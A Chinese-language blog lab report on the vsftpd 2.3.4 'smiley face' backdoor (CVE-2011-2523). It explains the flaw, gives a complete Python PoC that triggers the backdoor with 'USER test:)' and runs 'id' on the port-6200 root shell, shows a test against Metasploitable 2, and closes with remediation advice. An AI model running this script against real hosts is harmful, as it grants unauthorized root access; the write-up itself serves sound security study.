---
title: vsftpd 2.3.4 笑脸漏洞检测 PoC（CVE-2011-2523）
date: 2026-10-30
categories:
  - 实验报告
tags:
  - vsftpd
  - 笑脸漏洞
  - PoC
  - Python
  - CVE
permalink: vsftpd-smiley-poc/
---

## 一、漏洞简介

vsftpd 是 Linux 下广泛使用的 FTP 服务器软件。2011 年 7 月，其官方发布的 2.3.4 版本源码包被发现植入了后门，编号 **CVE-2011-2523**：当 FTP 登录用户名以 `:)`（笑脸符号）结尾时，服务端会在 **6200 端口**打开一个 **root 权限的 Shell**。由于触发特征是笑脸符号，该漏洞俗称「**笑脸漏洞**」。

<!-- more -->

值得注意的背景是：后门并不存在于 vsftpd 的正常开发代码中，而是混入了当时官方站点提供的 2.3.4 源码压缩包。官方随后发布 2.3.5 修复了该问题，但 2.3.4 版本仍大量存在于老旧的实验环境与靶机中（如 Metasploitable 2），是漏洞原理学习的经典案例。

## 二、漏洞原理

FTP 登录的标准流程是：客户端发送 `USER 用户名`，再发送 `PASS 密码`。植入的后门代码在用户名以 `:)` 结尾时，会在后台启动一个绑定在 6200 端口的 `/bin/sh`。攻击者无需任何口令，直接连接 6200 端口即可获得 root Shell。

检测思路据此设计为四步：

1. **版本探测**：连接 21 端口读取 banner，确认版本为 2.3.4；
2. **触发后门**：发送 `USER test:)` 与任意 `PASS`，触发后门启动；
3. **端口探测**：尝试连接 6200 端口，判断后门 Shell 是否开启；
4. **权限验证**：连接成功后执行 `id` 命令，若返回 `uid=0` 即确认获得 root 权限。

## 三、PoC 源码

PoC 使用 Python 标准库 `socket` 编写，无需安装第三方依赖。完整源码如下（`smiley_poc.py`）：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vsftpd 2.3.4 笑脸漏洞（CVE-2011-2523）检测 PoC

原理：vsftpd 2.3.4 官方源码包中被植入后门，登录用户名以 ":)" 结尾时，
服务端会在 6200 端口打开一个 root 权限的 Shell，俗称"笑脸漏洞"。

用法：python smiley_poc.py <目标IP> [端口=21]
注意：仅用于自己搭建的靶机（如 Metasploitable2）或授权目标，请勿用于未授权系统。
"""
import socket
import sys


def recv_banner(sock):
    """读取服务端返回，超时则返回空串"""
    sock.settimeout(5)
    try:
        return sock.recv(1024).decode(errors="ignore")
    except socket.timeout:
        return ""


def main():
    if len(sys.argv) < 2:
        print(f"用法: python {sys.argv[0]} <目标IP> [端口]")
        sys.exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 21

    print(f"[*] 目标: {host}:{port}")

    # 1. 连接 FTP 端口，读取 banner 判断版本
    try:
        s = socket.create_connection((host, port), timeout=5)
    except Exception as e:
        print(f"[-] 无法连接 FTP 端口: {e}")
        sys.exit(1)
    banner = recv_banner(s)
    print(f"[*] Banner: {banner.strip()}")
    if "2.3.4" in banner:
        print("[+] 版本为 vsftpd 2.3.4，疑似存在笑脸漏洞")
    else:
        print("[-] 未识别到 2.3.4 版本，可能不存在该漏洞")
        s.close()
        sys.exit(1)

    # 2. 发送带 ":)" 的用户名触发后门
    s.sendall(b"USER test:)\r\n")
    print("[*] 已发送 USER test:)")
    print(f"[*] 服务端响应: {recv_banner(s).strip()}")
    s.sendall(b"PASS test\r\n")
    print(f"[*] 服务端响应: {recv_banner(s).strip()}")
    s.close()

    # 3. 检测 6200 端口是否开启（后门 Shell）
    try:
        back = socket.create_connection((host, 6200), timeout=5)
        print("[+] 6200 端口已开启，漏洞存在！")
        # 4. 连接后门 Shell 执行 id 命令，确认权限
        back.sendall(b"id\n")
        out = back.recv(1024).decode(errors="ignore")
        print(f"[+] 后门 Shell 执行 id 返回: {out.strip()}")
        if "uid=0" in out:
            print("[+] 确认获得 root 权限")
        back.close()
    except Exception as e:
        print("[-] 6200 端口未开启，漏洞不存在或未触发")
        print(f"    详情: {e}")


if __name__ == "__main__":
    main()
```

{% asset_img shot1.png smiley_poc.py 源码截图（一） %}
{% asset_img shot2.png smiley_poc.py 源码截图（二） %}

代码要点说明：

- `socket.create_connection` 建立 TCP 连接，`timeout=5` 防止目标无响应时程序卡死；
- FTP 命令以 `\r\n` 结尾，与协议规范一致；
- banner 中含 `2.3.4` 即判定版本可疑，再通过「触发 → 探测 6200」两步完成确认，避免仅凭版本号误报；
- 最后用 `id` 命令验证权限，`uid=0` 即 root，形成完整的「检测 + 验证」闭环。

## 四、测试过程与结果

**测试环境：**

- 攻击机：Windows + Python 3；
- 靶机：Metasploitable 2 虚拟机（自带 vsftpd 2.3.4），与攻击机处于同一虚拟网络。

**测试步骤：**

1. 启动 Metasploitable 2，用 `ifconfig` 查看靶机 IP；
2. 攻击机运行 `python smiley_poc.py <靶机IP>`；
3. 观察输出：banner 版本识别 → 触发后门 → 6200 端口检测 → `id` 权限验证。

**测试结果：**

{% asset_img shot3.png smiley_poc.py 运行过程与结果 %}

从输出可以看到：banner 返回 `(vsFTPd 2.3.4)`，确认版本；发送 `USER test:)` 后 6200 端口成功建立连接；后门 Shell 执行 `id` 返回 `uid=0(root)`，**确认漏洞存在且获得 root 权限**。

## 五、修复建议与总结

**修复建议：**

- 升级 vsftpd 至 2.3.5 及以上版本，或使用发行版官方源安装（各发行版的安全更新已剔除后门代码）；
- 若无法立即升级，检查服务器是否异常监听 6200 端口，并限制 FTP 的访问来源；
- 对老旧系统（尤其 2011 年前后的发行版）做版本排查，重点检查对外提供的 FTP 服务。

**总结：**

本次实验用 Python 实现了笑脸漏洞的检测 PoC：先做版本识别，再主动触发后门，最后验证 6200 端口后门 Shell 的 root 权限，完整演示了「信息收集 → 触发 → 验证」的漏洞检测流程。体会最深的一点是：一个看起来普通的登录用户名（带一个笑脸符号）就能让服务器交出 root 权限，说明**软件供应链安全**同样重要——官方发布渠道被植入后门的案例提醒我们，对下载的源码包也应校验其来源与完整性。
